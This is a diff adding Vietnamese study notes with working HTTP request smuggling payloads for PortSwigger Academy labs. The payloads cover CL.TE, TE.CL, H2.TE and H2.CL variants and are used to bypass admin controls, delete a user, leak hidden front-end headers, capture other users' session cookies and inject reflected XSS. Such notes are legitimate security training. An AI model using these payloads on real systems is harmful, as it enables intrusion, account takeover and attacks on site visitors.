@@ -687,6 +687,265 @@ HTTP request smuggler extension
 
 https://github.com/seadragnol/PortSwiggerAcademy/tree/main/Request%20smuggling
 
+
+## confirming a CL.TE vulnerability (CL.TE không cần bỏ update length)
+
+Payload:
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 35
+Transfer-Encoding: chunked
+
+0
+
+GET /404 HTTP/1.1
+X-Ignore: X
+```
+
+## basic CL.TE vulnerability (request bằng GPOST)
+
+payload:
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Connection: keep-alive
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 6
+Transfer-Encoding: chunked
+
+0
+
+G
+```
+
+## Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
+
+payload:
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 116
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
+
+Phải có `Content-length: 10` để request thứ 2 sẽ phản hồi chậm hơn khi có người khác truy cập, nếu ko nó sẽ nhận diện là có 2 `Host`
+
+payload xóa:
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 139
+Transfer-Encoding: chunked
+
+0
+
+GET /admin/delete?username=carlos HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+
+x=
+```
+
+## confirming a TE.CL vulnerability (với loại này cần tắt update content length)
+
+payload:
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+5e
+POST /404 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+
+thêm `\r\n\r\n` sau `0`
+
+## basic TE.CL vulnerability
+
+## Exploiting HTTP request smuggling to bypass front-end security controls, TE.CL vulnerability
+
+payload:
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-length: 4
+Transfer-Encoding: chunked
+
+71
+POST /admin HTTP/1.1
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 15
+
+x=1
+0
+```
+
+thêm `\r\n\r\n` sau `0`
+
+## Exploiting HTTP request smuggling to reveal front-end request rewriting
+
+Trong 1 số trường hợp máy chủ phía trước sẽ gắn header ẩn để vào các path nhạy cảm
+
+Các để tìm header là tìm 1 nơi có phản ánh ra như search, email,...
+
+Sau đó 
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 124
+Transfer-Encoding: chunked
+
+0
+
+POST / HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 200
+Connection: close
+
+search=test
+```
+
+Cái request thứ 2 để content length 200 nhằm lấy được request có thêm header ẩn
+
+Sau đó 
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 143
+Transfer-Encoding: chunked
+
+0
+
+GET /admin HTTP/1.1
+X-abcdef-Ip: 127.0.0.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 10
+Connection: close
+
+x=1
+```
+
+## Exploiting HTTP request smuggling to capture other users' requests
+
+Tương tự kéo dài request để biết được cookie
+
+payload
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 256
+Transfer-Encoding: chunked
+
+0
+
+POST /post/comment HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 400
+Cookie: session=your-session-token
+
+csrf=your-csrf-token&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test
+```
+
+Content lenght 400 mà đoạn body chỉ 144 điều đó sẽ giúp nó đợi thêm 1 đoạn mới để ghép vào cho đủ rồi mới xử lí 
+
+## HTTP request smuggling to deliver reflected XSS
+
+context: lấy nội dung user-agent đưa vào comment
+
+payload:
+
+```http
+POST / HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 150
+Transfer-Encoding: chunked
+
+0
+
+GET /post?postId=5 HTTP/1.1
+User-Agent: a"/><script>alert(1)</script>
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 5
+
+x=1
+```
+
+cần gửi vài lần
+
+## H2.TE request smuggling
+
+tắt update content length 
+
+payload:
+
+```http
+POST /x HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Transfer-Encoding: chunked
+
+0
+
+GET /x HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+```
+
+## H2.CL
+
+payload:
+
+```http
+POST / HTTP/2
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Length: 0
+
+GET /resources HTTP/1.1
+Host: foo
+Content-Length: 5
+
+x=1
+```
+
+## via CRLF injection
+
+(xem chi tiết)
+
+
 # Server-side template injection (SSTI)
 
 # Server-side request forgery (SSRF)
